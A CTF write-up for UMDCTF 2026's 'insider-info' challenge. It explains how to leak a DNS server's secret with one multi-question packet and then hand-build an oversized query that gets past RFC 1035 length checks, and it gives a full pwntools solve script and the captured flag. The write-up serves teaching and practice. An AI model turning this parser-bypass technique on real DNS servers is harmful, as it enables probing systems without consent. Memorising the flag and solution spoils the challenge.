---
title: "Insider Info: Bypassing DNS Length Limits"
date: 2026-04-27
ctf_event: "UMDCTF 2026"
challenge_name: "insider-info"
category: "Misc"
tags: ["networking", "dns", "python"]
points: 77
difficulty: "Medium"
description: "Bypassing DNS RFC 1035 domain length limitations to extract a flag using bulk DNS queries."
author: "Vo1ic"
draft: false
---

## Challenge Description

In this task, we are provided with the source code of a custom DNS server. The server generates a random "secret" that is 819 characters long and splits it into 13 subdomains of 63 characters each. If we make a TXT request to this massive generated domain (`<subdomain>.inside.info`), the server returns the flag.

The server also has an "oracle": if we query `<index>.inside.info`, it returns a single character of the secret at that index.

**Main constraint:** The server processes exactly **2 network requests** (`for _ in range(2):`), after which it closes the connection. Since the secret is 819 characters long, we cannot make 819 separate requests.

## Initial Analysis

The key to the first stage lies in how the server handles incoming DNS packets. According to the DNS protocol standard, a single packet can contain **multiple questions** (the `qdcount` field).

In the server's source code, we see this loop:

```python
for question in request.questions:
    # ...
    elif qname.matchWildcard("*.inside.info"):
        index = int(qname.label[0])
        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(secret[index])))
```

The server iterates over all the questions in our request and adds answers for each of them. This means we can put all 819 questions (0.inside.info, 1.inside.info, ..., 818.inside.info) into a single DNS packet. The server will process it and return all the characters of the secret at once, using only 1 out of the 2 available connections.

### The Obstacle: RFC 1035 Limitation

After getting the secret, we need to reconstruct the domain and send our second (and final) request for the flag. However, when we try to assemble the packet using the `dnslib` library (calling `req2.pack()`), the script crashes with an error:

`dnslib.label.DNSLabelError: Domain label too long`

Why does this happen?
The DNS standard (RFC 1035) strictly limits the total length of a domain name to 255 bytes. Our generated domain (819 characters + dots + .inside.info) significantly exceeds 800 bytes. The `dnslib` library adheres to the RFC and refuses to build such an invalid packet on the client side.

### The Bypass

Although `dnslib` blocks the creation of such a packet, the server code (which uses the same library for parsing) does not throw an error when reading the raw bytes. The solution is to assemble the second DNS request manually at the byte level, bypassing the `dnslib` checks, and send it directly to the socket.

## Step 1 — Bulk Secret Leak

First, we create a packet and add 819 `DNSQuestion` objects to it. We send it and parse the 819 responses, assembling them into a string according to the requested indices.

## Step 2 — Manual Packet Construction

Next, we construct the full domain name according to the server's logic (i:i+63). We manually construct the DNS request bytes: 12-byte header + encoded QNAME (label length + the label itself) + 4-byte footer (QTYPE/QCLASS).

## Step 3 — Solution Script

Below is the final exploit script:

```python
from pwn import *
from dnslib import DNSRecord, DNSQuestion, QTYPE

def solve():
    r = remote('challs.umdctf.io', 32323)

    # 1. Bulk secret leak
    log.info("Creating a request for a bulk leak...")
    req1 = DNSRecord()
    for i in range(819):
        req1.add_question(DNSQuestion(f"{i}.inside.info", QTYPE.TXT))

    pkt1 = req1.pack()
    r.send(len(pkt1).to_bytes(2, 'big') + pkt1)

    # Receive response
    resp1_len = int.from_bytes(r.recvn(2), 'big')
    resp1_data = r.recvn(resp1_len)
    resp1 = DNSRecord.parse(resp1_data)

    # Reconstruct the secret
    secret_list = [''] * 819
    for rr in resp1.rr:
        idx = int(str(rr.rname).split('.')[0])
        val = rr.rdata.data[0].decode()
        secret_list[idx] = val

    secret = "".join(secret_list)
    log.success(f"Length of the recovered secret: {len(secret)}")

    # 2. Domain formatting and manual packet creation
    k = 819
    subdomain = '.'.join([''.join(secret[i:i+63]) for i in range(0, k - 63 + 1, 63)])
    flag_qname = f"{subdomain}.inside.info"

    def build_manual_query(qname):
        header = b'\x13\x37\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
        qname_bytes = b''
        for label in qname.split('.'):
            if label:
                qname_bytes += bytes([len(label)]) + label.encode()
        qname_bytes += b'\x00' 
        footer = b'\x00\x10\x00\x01'
        return header + qname_bytes + footer

    pkt2 = build_manual_query(flag_qname)
    r.send(len(pkt2).to_bytes(2, 'big') + pkt2)

    # 3. Getting the flag
    resp2_len = int.from_bytes(r.recvn(2), 'big')
    resp2_data = r.recvn(resp2_len)
    resp2 = DNSRecord.parse(resp2_data)

    for rr in resp2.rr:
        if "flag" in str(rr.rname):
            flag = rr.rdata.data[0].decode()
            log.success(f"Flag captured: {flag}")

if __name__ == "__main__":
    solve()
```

## Flag

`UMDCTF{5Ur31Y_N0_0N3_W111_N071C3_MY_1N51D3r_7r4D1N6}`